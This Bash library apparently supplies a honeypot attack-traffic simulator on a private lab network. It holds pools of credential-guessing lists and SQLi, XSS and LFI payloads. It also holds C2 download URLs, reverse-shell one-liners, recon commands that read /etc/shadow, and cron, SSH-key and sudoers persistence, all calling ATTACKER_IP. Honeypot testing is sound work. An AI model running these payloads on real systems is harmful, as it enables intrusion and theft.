#!/bin/bash
# lib/common.sh - 공통 유틸리티, IP, 페이로드 풀

# ── 허니팟 IP ─────────────────────────────────────────────────────────────────
COWRIE_IP="172.30.0.10"
HERALDING_IP="172.30.0.11"
OPENCANARY_IP="172.30.0.12"
SNARE_IP="172.30.0.13"
DIONAEA_IP="172.30.0.14"
MAILONEY_IP="172.30.0.15"
CONPOT_IP="172.30.0.16"
TANNER_IP="172.30.0.17"
ATTACKER_IP="172.30.0.20"
ALL_HONEYPOT_IPS=("$COWRIE_IP" "$HERALDING_IP" "$OPENCANARY_IP" "$SNARE_IP" "$DIONAEA_IP" "$MAILONEY_IP" "$CONPOT_IP")

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -p 2222"

# ── 유틸리티 함수 ─────────────────────────────────────────────────────────────
rand_int() { echo $((RANDOM % ($2 - $1 + 1) + $1)); }

rand_pick() {
    local arr=("$@")
    echo "${arr[$((RANDOM % ${#arr[@]}))]}"
}

rand_subset() {
    local n=$1; shift
    printf '%s\n' "$@" | shuf 2>/dev/null | head -n "$n"
}

rand_sleep() { sleep "$(rand_int "${1:-0}" "${2:-2}")"; }

# ── 유저명 풀 ─────────────────────────────────────────────────────────────────
USER_POOL=(
    root admin administrator pi ubuntu user guest test oracle git
    deploy backup www-data mysql postgres apache nginx operator support
    service ec2-user vagrant hadoop hdfs spark flink kafka zookeeper
    jenkins gitlab docker kubernetes ansible terraform dev ops sysadmin
    ftpuser mailuser dbadmin webmaster monitor nagios zabbix splunk elastic
)

# ── 패스워드 풀 ───────────────────────────────────────────────────────────────
PASS_POOL=(
    password 123456 admin root letmein qwerty monkey master password1
    12345678 abc123 iloveyou hello secret 1234 admin123 password123
    test user guest pass login welcome dragon sunshine princess shadow
    superman michael football baseball soccer charlie donald hunter ranger
    batman trustno1 access passw0rd p@ssword Pa\$\$w0rd admin@123 root123
    toor pass123 123abc 000000 111111 696969 123123 121212 123321 654321
    qwerty123 raspberry changeme default 1q2w3e 1qaz2wsx zxcvbn asdfgh
    P@ssw0rd Summer2024 Winter2023 Spring2024 Autumn2023 Company123
    Passw0rd! Admin@2024 Root@123 Welcome1 Hello123 Test@123 abc@123
)

# ── User-Agent 풀 ─────────────────────────────────────────────────────────────
UA_POOL=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    "Nikto/2.1.6"
    "sqlmap/1.7.8#stable (https://sqlmap.org)"
    "Masscan/1.3"
    "curl/7.88.1"
    "python-requests/2.28.2"
    "Go-http-client/1.1"
    "zgrab/0.x"
    "Nmap Scripting Engine"
    "WPScan v3.8.22"
    "Dirbuster/1.0-RC1"
    "Hydra/9.4"
)

# ── SQLi 페이로드 풀 ──────────────────────────────────────────────────────────
SQLI_POOL=(
    "' OR '1'='1"
    "' OR 1=1--"
    "'; DROP TABLE users--"
    "1' AND SLEEP(5)--"
    "' UNION SELECT NULL,NULL,NULL--"
    "admin'--"
    "' OR 'x'='x"
    "1; SELECT * FROM information_schema.tables--"
    "' AND 1=2 UNION SELECT user(),password FROM mysql.user--"
    "1' ORDER BY 3--"
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
    "1 AND 1=1"
    "' OR EXISTS(SELECT * FROM users)--"
)

# ── XSS 페이로드 풀 ───────────────────────────────────────────────────────────
XSS_POOL=(
    "<script>alert(document.cookie)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert('XSS')>"
    "'\"><script>fetch('http://$ATTACKER_IP/?c='+document.cookie)</script>"
    "<iframe src=javascript:alert(1)>"
    "<input onfocus=alert(1) autofocus>"
    "%3Cscript%3Ealert(1)%3C/script%3E"
    "<details open ontoggle=alert(1)>"
)

# ── LFI 경로 풀 ───────────────────────────────────────────────────────────────
LFI_POOL=(
    "../../../../etc/passwd"
    "../../../../etc/shadow"
    "../../../../etc/hosts"
    "../../../../proc/self/environ"
    "../../../../var/log/apache2/access.log"
    "../../../../windows/system32/drivers/etc/hosts"
    "../../../../boot.ini"
    "php://filter/convert.base64-encode/resource=index.php"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
    "expect://id"
)

# ── 웹 경로 풀 (정찰/스캔) ────────────────────────────────────────────────────
WEB_PATH_POOL=(
    /admin /phpmyadmin /wp-admin /manager /console /.git/config /.env
    /backup /config /api /swagger /actuator /health /metrics /debug
    /login /dashboard /panel /administrator /setup /install /wp-login.php
    /.htaccess /robots.txt /sitemap.xml /server-status /server-info
    /api/v1/users /api/v2/admin /graphql /.well-known/security.txt
    /shell.php /cmd.php /webshell.php /c99.php /r57.php /b374k.php
)

# ── 악성코드 C2 URL 풀 ────────────────────────────────────────────────────────
C2_URL_POOL=(
    "http://$ATTACKER_IP:8888/malware.sh"
    "http://$ATTACKER_IP:8080/payload.bin"
    "http://$ATTACKER_IP:4444/stage2.py"
    "http://$ATTACKER_IP:9090/rootkit.tar.gz"
    "http://$ATTACKER_IP:8000/backdoor.sh"
    "http://$ATTACKER_IP:3000/miner"
    "http://$ATTACKER_IP:1337/exploit.py"
)

# ── 리버스셸 명령어 풀 ────────────────────────────────────────────────────────
REVSHELL_POOL=(
    "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
    "nc $ATTACKER_IP 4444 -e /bin/bash"
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f"
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    "perl -e 'use Socket;\$i=\"$ATTACKER_IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ATTACKER_IP\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    "php -r '\$sock=fsockopen(\"$ATTACKER_IP\",4444);\$proc=proc_open(\"/bin/sh\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
)

# ── SSH 침투 후 명령어 풀 ─────────────────────────────────────────────────────
POST_INTRUSION_POOL=(
    "uname -a" "whoami" "id" "cat /etc/passwd" "cat /etc/shadow"
    "cat /etc/hosts" "ls -la /" "ls -la /home" "ls -la /tmp"
    "ps aux" "netstat -an" "ifconfig" "ip addr" "arp -a" "env"
    "history" "last" "w" "who" "df -h" "free -m"
    "cat /proc/version" "cat /proc/cpuinfo" "lscpu"
    "find / -perm -4000 -type f 2>/dev/null"
    "find / -writable -type f 2>/dev/null | head -20"
    "ss -tulpn" "cat /proc/net/tcp" "route -n"
    "cat /var/log/auth.log 2>/dev/null | tail -20"
    "crontab -l" "ls -la /etc/cron*"
    "grep -r 'password' /etc/ 2>/dev/null | head -10"
)

# ── 지속성 확보 명령어 풀 ─────────────────────────────────────────────────────
PERSISTENCE_POOL=(
    "echo '*/5 * * * * curl -s http://$ATTACKER_IP/cmd | bash' | crontab -"
    "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E attacker@evil' >> ~/.ssh/authorized_keys"
    "echo '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1' >> ~/.bashrc"
    "useradd -m -s /bin/bash -p \$(openssl passwd -1 backdoor) backdoor123"
    "echo 'backdoor123 ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
    "(crontab -l; echo '@reboot nc $ATTACKER_IP 4444 -e /bin/bash') | crontab -"
)
